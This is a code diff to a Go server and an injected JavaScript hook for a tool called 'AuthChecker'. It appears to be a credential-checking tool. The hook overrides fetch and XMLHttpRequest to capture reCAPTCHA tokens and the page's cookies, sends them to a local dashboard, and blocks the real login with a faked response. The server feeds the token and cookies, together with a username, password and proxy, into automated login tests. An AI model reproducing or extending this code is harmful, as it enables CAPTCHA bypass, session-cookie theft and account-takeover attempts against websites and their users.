@@ -34,8 +34,9 @@ type Server struct {
 	engine *runner.Engine
 	runID  int64
 
-	lastToken     string
-	lastTokenTime time.Time
+	lastToken      string
+	lastCookies    string
+	lastTokenTime  time.Time
 }
 
 type Options struct {
@@ -92,8 +93,10 @@ func (s *Server) handleCaptureToken(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var req struct {
-		Token string `json:"token"`
-		URL   string `json:"url"`
+		Token   string `json:"token"`
+		Cookies string `json:"cookies"`
+		URL     string `json:"url"`
+		Blocked bool   `json:"blocked"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Token == "" {
 		jsonError(w, "token required", 400)
@@ -102,16 +105,18 @@ func (s *Server) handleCaptureToken(w http.ResponseWriter, r *http.Request) {
 
 	s.mu.Lock()
 	s.lastToken = req.Token
+	s.lastCookies = req.Cookies
 	s.lastTokenTime = time.Now()
 	s.mu.Unlock()
 
-	fmt.Printf("token captured (%d chars) from %s\n", len(req.Token), req.URL)
-	jsonOK(w, map[string]interface{}{"ok": true, "length": len(req.Token)})
+	fmt.Printf("token captured (%d chars, blocked=%v) from %s\n", len(req.Token), req.Blocked, req.URL)
+	jsonOK(w, map[string]interface{}{"ok": true, "length": len(req.Token), "blocked": req.Blocked})
 }
 
 func (s *Server) handleLastToken(w http.ResponseWriter, r *http.Request) {
 	s.mu.Lock()
 	token := s.lastToken
+	cookies := s.lastCookies
 	captured := s.lastTokenTime
 	s.mu.Unlock()
 
@@ -120,9 +125,10 @@ func (s *Server) handleLastToken(w http.ResponseWriter, r *http.Request) {
 		age = int64(time.Since(captured).Seconds())
 	}
 	jsonOK(w, map[string]interface{}{
-		"token":      token,
-		"length":     len(token),
-		"age_sec":    age,
+		"token":       token,
+		"cookies":     cookies,
+		"length":      len(token),
+		"age_sec":     age,
 		"captured_at": captured.Format(time.RFC3339),
 	})
 }
@@ -144,28 +150,35 @@ func tokenHookScript() string {
   if(window.__authCheckerHook)return;
   window.__authCheckerHook=true;
   const API='http://localhost:8080/api/capture-token';
-  function send(url,body){
+  function isLogin(u){return u&&(u.includes('/api/login')||u.includes('/login'));}
+  function send(url,body,blocked){
     try{
       const j=typeof body==='string'?JSON.parse(body):body;
       const t=j&&(j.recaptchaToken||j['g-recaptcha-response']);
-      if(!t)return;
+      if(!t)return false;
       fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({token:t,url:url||location.href})});
-      try{navigator.clipboard.writeText(t);}catch(e){}
-      console.log('[AuthChecker] token sent to dashboard ('+t.length+' chars)');
-    }catch(e){}
+        body:JSON.stringify({token:t,cookies:document.cookie,url:url||location.href,blocked:!!blocked})});
+      console.log('[AuthChecker] token sent ('+t.length+' chars) blocked='+blocked);
+      return true;
+    }catch(e){return false;}
   }
+  const fake=()=>Promise.resolve(new Response('{"success":false,"reason":"interceptedByAuthChecker"}',{status:200,headers:{'Content-Type':'application/json'}}));
   const _fetch=window.fetch;
   window.fetch=function(input,init){
     const url=typeof input==='string'?input:(input&&input.url)||'';
-    if(init&&init.body)send(url,init.body);
+    if(isLogin(url)&&init&&init.body&&send(url,init.body,true))return fake();
+    if(init&&init.body)send(url,init.body,false);
     return _fetch.apply(this,arguments);
   };
   const _open=XMLHttpRequest.prototype.open;
   const _send=XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open=function(m,u){this._hookUrl=u;return _open.apply(this,arguments);};
-  XMLHttpRequest.prototype.send=function(body){if(body)send(this._hookUrl,body);return _send.apply(this,arguments);};
-  alert('AuthChecker hook active! Ab login submit karo — token auto dashboard par jayega.');
+  XMLHttpRequest.prototype.send=function(body){
+    if(isLogin(this._hookUrl)&&body&&send(this._hookUrl,body,true)){this.readyState=4;this.status=200;this.responseText='{"success":false,"reason":"intercepted"}';if(this.onload)this.onload();return;}
+    if(body)send(this._hookUrl,body,false);
+    return _send.apply(this,arguments);
+  };
+  alert('Hook ON — login submit block hoga, FRESH token dashboard par jayega. Turant Test One dabao!');
 })();`
 }
 
@@ -326,6 +339,7 @@ type testRequest struct {
 	Password        string `json:"password"`
 	Proxy           string `json:"proxy"`
 	RecaptchaToken  string `json:"recaptcha_token"`
+	Cookies         string `json:"cookies"`
 }
 
 func (s *Server) handleTestSingle(w http.ResponseWriter, r *http.Request) {
@@ -357,6 +371,7 @@ func (s *Server) handleTestSingle(w http.ResponseWriter, r *http.Request) {
 		Password:       req.Password,
 		ProxyURL:       req.Proxy,
 		RecaptchaToken: req.RecaptchaToken,
+		CustomCookies:  req.Cookies,
 	})
 
 	jsonOK(w, result)
